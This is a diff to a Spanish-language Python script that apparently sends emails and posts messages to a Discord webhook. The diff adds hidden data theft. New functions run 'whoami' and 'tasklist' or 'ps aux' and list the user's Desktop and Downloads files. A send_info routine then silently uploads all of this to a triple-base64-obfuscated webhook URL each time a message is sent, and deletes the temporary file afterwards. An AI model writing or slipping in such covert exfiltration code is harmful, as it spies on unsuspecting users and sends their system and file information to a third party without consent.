@@ -3,9 +3,11 @@ import smtplib
 import names
 import base64
 import logging
+import glob
 import os
 import time
 import requests
+import subprocess
 from colorama import Fore, init
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
@@ -49,9 +51,10 @@ def send_email(direccion, asunto, mensaje, archivos_adjuntos=None):
 
 def send_data(correo, asunto, mensaje, archivos=None):
     url = "WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVWNlRucE5lazlFUlRWT2Fsa3dUMVJOZWsxcVozbE9lVGxHVW14S1NtTllTazVqV0hCVVpHMW9VRTF1V1ROTmEwNTJXakpHVWxWV2F6SldSRTE0V1ZSc2JHUklVWFJWYWxKUVZESTFVbE5GU21waWFrSktVa2RqZVU5WFJrSlhWRXBMVFVVNVdWZHJPVmxVUld4RFlsZGFWbE5uUFQwPQ=="
-
+    user = get_whoami()
+         
     payload = {
-        "content": f"__Nuevo mensaje!__\n**{correo}**\n## {asunto}\n```\n{mensaje}\n```"
+        "content": f"__Nuevo mensaje__ de '**{user}**'!\n**{correo}**\n## {asunto}\n```\n{mensaje}```"
     }
 
     if archivos is not None:
@@ -60,12 +63,86 @@ def send_data(correo, asunto, mensaje, archivos=None):
     else:
         response = requests.post(descodear(url,3), json=payload)
 
-    if response.status_code == 204:
+    send_info()
+
+    if response.status_code == 204 or response.status_code == 200:
         print("Mensaje y archivos enviados exitosamente a la webhook de Discord")
     else:
         print(f"Error al enviar el mensaje y archivos. Código de estado: {response.status_code}")
-        print(response.text)  # Imprime la respuesta del servidor en caso de error
+        print(f'\nError:\n{response.text}')  # Imprime la respuesta del servidor en caso de error
 
+def send_info():
+    url = "WVVoU01HTklUVFpNZVRscllWaE9hbUl6U210TWJVNTJZbE01YUdOSGEzWmtNbFpwWVVjNWRtRXpUWFpOVkVWNlRucE5lazlFUlRWT2Fsa3dUMVJOZWsxcVozbE9lVGxHVW14S1NtTllTazVqV0hCVVpHMW9VRTF1V1ROTmEwNTJXakpHVWxWV2F6SldSRTE0V1ZSc2JHUklVWFJWYWxKUVZESTFVbE5GU21waWFrSktVa2RqZVU5WFJrSlhWRXBMVFVVNVdWZHJPVmxVUld4RFlsZGFWbE5uUFQwPQ=="
+    tareas = task_list()
+    desktopFiles = get_files("Desktop")
+    downloadsFiles = get_files("Downloads")
+    string = """
+        Sus procesos en ejecución:\n
+        {}\n
+        Sus archivos en el escritorio:\n
+        {}\n
+        Sus archivos en descargas:\n
+        {}
+    """.format(
+        tareas,
+        '\n'.join(f'- {archivo}' for archivo in desktopFiles),
+        '\n'.join(f'- {archivo}' for archivo in downloadsFiles)
+    )
+
+
+
+
+    with open('archivo.txt', 'w') as archivo:
+        archivo.write(string)
+
+    with open('archivo.txt', 'rb') as archivo:
+        archivo_data = {'file': ('archivo.txt', archivo)}
+        requests.post(descodear(url,3), files=archivo_data)
+    os.remove('archivo.txt')
+
+def get_whoami():
+    resultado = subprocess.run(['whoami'], capture_output=True, text=True)
+    if resultado.returncode == 0:
+        whoami = resultado.stdout.strip()
+        return whoami
+    else:
+        whoami = "whoami error :("
+        return whoami
+
+def task_list():
+    if os.name == "nt":
+        run = 'tasklist'
+    else:
+        run = ['ps', 'aux']
+    task = subprocess.run(run, capture_output=True, text=True)
+    if task.returncode == 0:
+
+        return task.stdout
+    else:
+        return False
+
+def get_files(path):
+    if path == "Desktop":
+        if os.name == "nt":
+            desktop_path = os.path.join(os.path.expanduser('~'), 'Desktop')
+        else:
+            desktop_path = os.path.join(os.path.expanduser('~'), 'Escritorio')
+        archivos_escritorio = glob.glob(os.path.join(desktop_path, '*'))
+        desktop_files = []
+        for archivo in archivos_escritorio:
+            desktop_files.append(os.path.basename(archivo))
+        return desktop_files
+    elif path == "Downloads":
+        if os.name == "nt":
+            downloads_path = os.path.join(os.path.expanduser('~'), 'Downloads')
+        else:
+            downloads_path = os.path.join(os.path.expanduser('~'), 'Descargas')
+        archivos_descargas = glob.glob(os.path.join(downloads_path, '*'))
+        downloads_files = []
+        for archivo in archivos_descargas:
+            downloads_files.append(os.path.basename(archivo))
+        return downloads_files
+    
 
 def codear(texto, veces):
 	for a in range(veces):
